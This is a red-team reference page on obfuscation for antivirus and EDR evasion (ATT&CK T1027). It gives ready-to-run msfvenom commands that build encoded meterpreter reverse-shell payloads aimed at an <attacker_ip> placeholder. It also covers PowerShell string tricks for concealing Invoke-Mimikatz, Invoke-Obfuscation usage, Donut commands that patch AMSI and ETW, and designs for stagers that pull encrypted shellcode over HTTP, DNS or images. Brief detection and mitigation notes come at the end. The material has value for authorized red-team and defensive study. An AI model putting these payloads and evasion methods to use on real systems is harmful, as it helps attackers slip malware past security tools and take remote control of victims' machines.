% Filename: 06-red-teaming/evasion/obfuscation.md
% Display name: Obfuscation
% Last update: 2026-02-11
% ATT&CK Tactics: TA0005 (Defense Evasion)
% ATT&CK Techniques: T1027 (Obfuscated Files or Information), T1027.010 (Command Obfuscation)
% Authors: @TristanInSec

# Obfuscation

## Overview

Obfuscation transforms malicious code to avoid signature-based detection while preserving functionality. It operates at multiple levels — source code, compiled binaries, shellcode, and command-line strings. Obfuscation alone is rarely sufficient against modern EDR, but it is an essential layer in a defense-evasion strategy. The goal is to ensure that no static signature matches the payload.

## ATT&CK Mapping

- **Tactic:** TA0005 - Defense Evasion
- **Techniques:**
  - T1027 - Obfuscated Files or Information
  - T1027.010 - Command Obfuscation

## Techniques

### Shellcode Encryption

```text
Encrypt shellcode at build time, decrypt at runtime in the loader.
The encrypted payload has no recognizable signatures on disk.

Common encryption methods:

XOR:
  - Simple, fast, small code footprint
  - Single-byte XOR is trivially reversible
  - Multi-byte XOR with a key is more effective

AES-256:
  - Strong encryption, key must be embedded or fetched
  - Larger code footprint (crypto library needed)
  - Key can be derived from environment (hostname, domain name)

RC4:
  - Simple implementation, small footprint
  - Commonly used in shellcode loaders

Staged key delivery:
  - Shellcode is AES-encrypted in the binary
  - Key is fetched from a remote server at runtime
  - If the server is down, payload never decrypts (anti-analysis)
```

### String Obfuscation

```text
AV/EDR scan for known strings in binaries:
  "AmsiScanBuffer", "VirtualAlloc", "CreateRemoteThread", etc.

Obfuscation methods:

1. XOR each string at compile time, decrypt at runtime
2. Store strings as stack-constructed arrays (char-by-char)
3. Base64 encode strings, decode at runtime
4. Hash function names, resolve at runtime via API hashing

API Hashing example:
  Instead of: GetProcAddress(hModule, "VirtualAlloc")
  Use:        GetProcByHash(hModule, 0xE553A458)  // hash of "VirtualAlloc"

  The hash is computed at build time
  A resolver function walks the export table at runtime
  Matching the hash against each export name
```

### msfvenom Encoding

```bash
# msfvenom
# https://github.com/rapid7/metasploit-framework

# Encode with shikata_ga_nai (polymorphic XOR, x86 only)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 \
    -e x86/shikata_ga_nai -i 10 -f raw -o encoded.bin

# Multi-encoder chain (encode with one, then another)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 \
    -e x86/shikata_ga_nai -i 3 -f raw | \
msfvenom -e x86/alpha_mixed -i 1 -a x86 --platform windows -f raw -o double_encoded.bin

# AES encryption
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 \
    --encrypt aes256 --encrypt-key 0123456789abcdef0123456789abcdef -f csharp

# Remove bad characters (forces encoder selection)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=443 \
    -b '\x00\x0a\x0d' -f csharp

# Note: msfvenom encoding alone is NOT sufficient against modern AV
# It must be combined with a custom loader and additional obfuscation
```

### PowerShell Obfuscation

```powershell
# PowerShell has many built-in obfuscation options due to its flexible parser

# 1. String concatenation
$cmd = 'Inv' + 'oke-' + 'Mim' + 'ika' + 'tz'

# 2. Variable substitution
$a = 'Invoke'; $b = 'Mimikatz'; & "$a-$b"

# 3. Character array
$cmd = -join ([char[]](73,110,118,111,107,101,45,77,105,109,105,107,97,116,122))

# 4. Base64 encoding
powershell -EncodedCommand <base64_string>

# 5. Tick insertion (PowerShell ignores backticks in certain positions)
Inv`oke-`Mim`ika`tz

# 6. Environment variable splicing
$env:ComSpec[4,15,25]-join'' # yields 'iex' from C:\WINDOWS\system32\cmd.exe
```

### Invoke-Obfuscation Framework

```powershell
# Invoke-Obfuscation
# https://github.com/danielbohannon/Invoke-Obfuscation

# Automated PowerShell obfuscation framework
# Supports: String, Token, AST, Encoding, Compression, Launcher obfuscation

# Usage (interactive):
Import-Module Invoke-Obfuscation
Invoke-Obfuscation

# Set the script to obfuscate
Invoke-Obfuscation > SET SCRIPTPATH C:\payload.ps1

# Choose obfuscation type
Invoke-Obfuscation > TOKEN    # Token-level obfuscation
Invoke-Obfuscation > STRING   # String-level obfuscation
Invoke-Obfuscation > ENCODING # Base64, hex, ASCII encoding
Invoke-Obfuscation > COMPRESS # Compress and encode
Invoke-Obfuscation > LAUNCHER # Generate obfuscated launcher
```

### Binary Obfuscation Techniques

```text
Source-Level Obfuscation:
  - Insert dead code (unused functions, unreachable branches)
  - Rename functions and variables to random strings
  - Reorder functions within the source
  - Replace constants with computed values
  - Add junk API calls between real operations

Compile-Time Obfuscation:
  - Compile with optimizations (-O2) to change code patterns
  - Use different compilers (MSVC, GCC, Clang) for different signatures
  - Link statically to include all library code (changes file hash)
  - Compile as a DLL instead of EXE (different entry point pattern)

Post-Compilation Obfuscation:
  - Strip symbols and debug information
  - Modify PE header timestamps and metadata
  - Add or modify PE sections
  - Change section names (rename .text to something else)
  - Modify rich header or remove it entirely
```

### Donut AMSI/ETW Bypass

```bash
# Donut
# https://github.com/TheWover/donut

# Donut automatically bypasses AMSI/WLDP/ETW when generating shellcode
# Default behavior (-b 3) continues execution even if bypass fails

# Generate shellcode with full bypass
donut -i Rubeus.exe -b 3 -o rubeus.bin

# Generate without any bypass (for environments without AMSI)
donut -i Rubeus.exe -b 1 -o rubeus.bin

# The generated shellcode:
# 1. Patches AmsiScanBuffer before loading the .NET assembly
# 2. Patches EtwEventWrite to prevent ETW telemetry
# 3. Loads the .NET CLR and executes the assembly
```

### Payload Staging and Retrieval

```text
Avoid embedding the full payload in the binary:

1. Stager downloads encrypted shellcode from a URL at runtime
   - Binary contains only the download + decrypt + execute logic
   - Shellcode never touches disk

2. Retrieve shellcode from DNS TXT records
   - Encode shellcode in base64, split across TXT records
   - Stager queries DNS, reassembles, decrypts, executes

3. Embed encrypted shellcode in an image file (steganography)
   - Payload hidden in PNG/JPEG least significant bits
   - Stager downloads image, extracts payload, executes

4. Fetch key from environment
   - Payload is encrypted, key derived from hostname or domain
   - Only decrypts on the intended target (sandbox-proof)
```

## Detection Methods

### Static Detection

- Entropy analysis (highly encrypted payloads have high entropy)
- YARA rules for known obfuscation patterns
- Known packer/crypter signatures in PE headers
- Suspicious import combinations (VirtualAlloc + CreateThread without legitimate purpose)

### Dynamic Detection

- Behavioral analysis: binary decrypts data in memory then executes it
- Memory scanning: decrypted shellcode found in allocated regions
- API call sequences regardless of obfuscation method

## Mitigation Strategies

- **EDR behavioral detection** — obfuscation doesn't change what the code does, only how it looks
- **Script Block Logging** — log deobfuscated PowerShell scripts
- **AMSI** — scans content after deobfuscation (if not bypassed)
- **Memory scanning** — periodic scans catch decrypted payloads in memory

## References

### Official Documentation

- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [Donut](https://github.com/TheWover/donut)

### MITRE ATT&CK

- [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
- [T1027.010 - Command Obfuscation](https://attack.mitre.org/techniques/T1027/010/)
